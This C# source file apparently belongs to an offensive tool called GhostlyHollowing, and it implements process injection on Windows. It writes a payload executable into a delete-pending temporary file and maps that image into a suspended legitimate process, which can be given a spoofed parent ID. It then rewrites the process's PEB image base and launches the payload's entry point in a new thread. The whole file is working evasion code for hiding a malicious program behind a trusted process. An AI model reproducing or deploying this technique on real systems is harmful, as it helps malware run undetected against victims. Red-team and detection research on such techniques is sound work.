using System;
using System.IO;
using GhostlyHollowing.Interop;

namespace GhostlyHollowing.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateGhostlyHollowingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hGhostSection;
            IntPtr hHollowingProcess;
            IntPtr pNewSectionBase;
            IntPtr pPeb;
            IntPtr pRemoteEntryPoint;
            IntPtr pRemoteProcessParameters;
            uint nEntryPointOffset;
            string archImage;
            string archTarget;
            string imagePathName;
            string tempFilePath = Path.GetTempFileName();

            if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, should be built as 32bit binary.");

                return false;
            }

            Console.WriteLine("[>] Loading image data.");

            try
            {
                using (var peImage = new PeFile(imageData))
                {
                    archImage = peImage.GetArchitecture();
                    nEntryPointOffset = peImage.GetAddressOfEntryPoint();
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to load image data.");

                return false;
            }

            Console.WriteLine("[+] Image data is loaded successfully.");
            Console.WriteLine("    [*] Architecture : {0}", archImage);

            if (Environment.Is64BitOperatingSystem &&
                (string.Compare(archImage, "x64", StringComparison.OrdinalIgnoreCase) != 0))
            {
                Console.WriteLine("[-] Should be x64 PE data in 64bit OS.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem &&
                (string.Compare(archImage, "x86", StringComparison.OrdinalIgnoreCase) != 0))
            {
                Console.WriteLine("[-] Should be x86 PE data in 32bit OS.");

                return false;
            }

            Console.WriteLine("[>] Trying to load target image file.");

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve target image path.");

                return false;
            }
            else
            {
                try
                {
                    using (var peImage = new PeFile(imagePathName))
                    {
                        archTarget = peImage.GetArchitecture();

                        Console.WriteLine("[+] Taget image is loaded successfully.");
                        Console.WriteLine("    [*] Image Path Name : {0}", imagePathName);
                        Console.WriteLine("    [*] Architecture    : {0}", archTarget);
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Failed to load target image.");

                    return false;
                }
            }

            if (archImage != archTarget)
            {
                Console.WriteLine("[!] Payload architecture should be matched with target image architecture.");

                return false;
            }

            Console.WriteLine("[>] Trying to create delete pending file.");
            Console.WriteLine("    [*] File Path : {0}", tempFilePath);

            hGhostSection = Utilities.CreateDeletePendingFileSection(
                tempFilePath,
                imageData);

            if (hGhostSection == Win32Consts.INVALID_HANDLE_VALUE)
            {
                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                return false;
            }

            hHollowingProcess = Utilities.CreateSuspendedProcess(
                imagePathName,
                ppid);

            if (hHollowingProcess == IntPtr.Zero)
            {
                NativeMethods.NtClose(hGhostSection);

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                return false;
            }

            Console.WriteLine("[>] Trying to map delete pending section to the hollowing process.");

            pNewSectionBase = Utilities.MapSectionToProcess(
                hHollowingProcess,
                hGhostSection);
            NativeMethods.NtClose(hGhostSection);

            if (pNewSectionBase == IntPtr.Zero)
            {
                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
                NativeMethods.NtClose(hHollowingProcess);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Delete pending section is mapped to the hollowing process successfully.");
                Console.WriteLine("    [*] Section Base : 0x{0}", pNewSectionBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
            }

            pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt64() + nEntryPointOffset);

            Console.WriteLine("[>] Trying to get ntdll!_PEB address for the hollowing process.");

            if (!Helpers.GetProcessBasicInformation(
                hHollowingProcess,
                out PROCESS_BASIC_INFORMATION pbi))
            {
                Console.WriteLine("[-] Failed to get ntdll!_PEB address for the hollowing process.");

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
                NativeMethods.NtClose(hHollowingProcess);

                return false;
            }
            else
            {
                pPeb = pbi.PebBaseAddress;
                Console.WriteLine("[+] Got hollowing process basic information.");
                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
            }

            // Overwrite ntdll!_PEB for hollowing process.
            if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pNewSectionBase))
            {
                Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }

            Console.WriteLine("[>] Trying to set process parameters to the hollowing process.");

            pRemoteProcessParameters = Utilities.SetProcessParameters(
                hHollowingProcess,
                imagePathName,
                commandLine,
                Environment.CurrentDirectory,
                windowTitle);

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to set process parameters.");

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
                NativeMethods.NtClose(hHollowingProcess);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Process parameters are set successfully.");
            }

            Console.WriteLine("[>] Trying to start hollowing process thread.");

            ntstatus = NativeMethods.NtCreateThreadEx(
                out IntPtr hThread,
                ACCESS_MASK.THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hHollowingProcess,
                pRemoteEntryPoint,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create thread.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
            }
            else
            {
                Console.WriteLine("[+] Thread is resumed successfully.");
            }

            NativeMethods.NtClose(hThread);
            NativeMethods.NtClose(hHollowingProcess);

            try
            {
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
            }

            return (ntstatus == Win32Consts.STATUS_SUCCESS);
        }
    }
}
